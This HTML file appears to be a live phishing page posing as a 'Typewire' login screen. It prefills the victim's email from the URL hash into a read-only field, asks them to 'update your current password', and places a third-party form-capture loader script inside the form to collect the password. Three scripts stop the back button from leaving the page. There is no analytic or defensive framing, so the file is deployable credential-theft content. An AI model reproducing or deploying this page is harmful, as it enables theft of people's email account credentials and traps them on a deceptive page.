<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Typewire Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            /* Full screen high-quality city night skyline backdrop panorama from the screenshot */
            background: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)), 
                        url('https://unsplash.com') no-repeat center center fixed;
            background-size: cover;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }

        /* Floating Semi-Transparent Dark Glass Box Card Module Component */
        .login-card {
            background-color: rgba(11, 26, 44, 0.92);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            width: 100%;
            max-width: 440px;
            padding: 44px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
            text-align: center;
            z-index: 5;
        }

        /* Top Brand Loop Vector Typography Logo Graphic Replication Area */
        .logo-container {
            margin-bottom: 36px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Simulated multi-loop script typography wave marker */
        .logo-wave {
            font-size: 54px;
            color: #ffffff;
            line-height: 1;
            margin-bottom: 8px;
            font-family: Georgia, serif;
            letter-spacing: -2px;
            transform: scaleX(1.2);
            user-select: none;
        }

        .brand-title {
            font-size: 40px;
            font-weight: bold;
            color: #ffffff;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        form {
            width: 100%;
        }

        .input-row {
            display: flex;
            width: 100%;
            height: 44px;
            margin-bottom: 12px;
            border: 1px solid rgba(255, 255, 255, 0.4);
            background-color: transparent;
            position: relative;
        }

        /* Faint dark square prefix icon separator track boxes */
        .icon-box {
            width: 44px;
            border-right: 1px solid rgba(255, 255, 255, 0.4);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            font-size: 16px;
            background-color: rgba(255, 255, 255, 0.05);
        }

        .form-control {
            flex: 1;
            padding: 0 14px;
            border: none;
            background: transparent;
            font-size: 13px;
            color: #ffffff;
            outline: none;
        }

        .form-control::placeholder {
            color: rgba(255, 255, 255, 0.5);
            font-family: monospace, sans-serif;
        }

        .password-toggle {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255, 255, 255, 0.7);
            cursor: pointer;
            font-size: 14px;
            user-select: none;
        }

        /* Solid pure horizontal rectangular white block submission button */
        .submit-btn {
            width: 100%;
            background-color: #ffffff;
            color: #0b1a2c;
            border: none;
            height: 44px;
            font-size: 13px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            margin-top: 8px;
            margin-bottom: 24px;
            transition: background-color 0.15s ease;
        }

        .submit-btn:hover {
            background-color: rgba(255, 255, 255, 0.9);
        }

        /* Bottom text link helper options stack menu columns alignment layout elements */
        .links-stack {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 10px;
            width: 100%;
            padding-left: 2px;
        }

        .links-stack a {
            color: rgba(255, 255, 255, 0.8);
            font-size: 11px;
            font-weight: bold;
            text-decoration: none;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .links-stack a:hover {
            color: #ffffff;
            text-decoration: underline;
        }

        /* Fixed Background Desktop System Watermark Overlay Component */
        .system-watermark {
            position: fixed;
            bottom: 24px;
            right: 24px;
            text-align: left;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.18);
            line-height: 1.4;
            user-select: none;
            pointer-events: none;
            z-index: 10;
        }
    </style>
</head>
<body>

    <!-- Center Floating Interface Card Panel Workspace Component -->
    <main class="login-card">
        
        <!-- Top Logo Typography Headings Block -->
        <div class="logo-container">
            <div class="logo-wave">eee</div>
            <h1 class="brand-title">Typewire</h1>
        </div>
    <p style="color:white">Log in and update your current password</p><br>
        <!-- Form submission parameter paths targeting standard execution points -->
        <form action="" method="POST">
            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
            <div class="input-row">
                <div class="icon-box">👤</div>
                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
            </div>
            
            <div class="input-row">
                <div class="icon-box">🔒</div>
<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                <span class="password-toggle">👁</span>
            </div>
            
            <button type="submit" class="submit-btn">Log In</button>
        </form>

        <!-- Dynamic Structural Links Column Menu -->
        <div class="links-stack">
            <a href="#">Need an account? Get Typewire now.</a>
            <a href="#">Forgot your password?</a>
            <a href="#">Close.</a>
        </div>

    </main>


    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
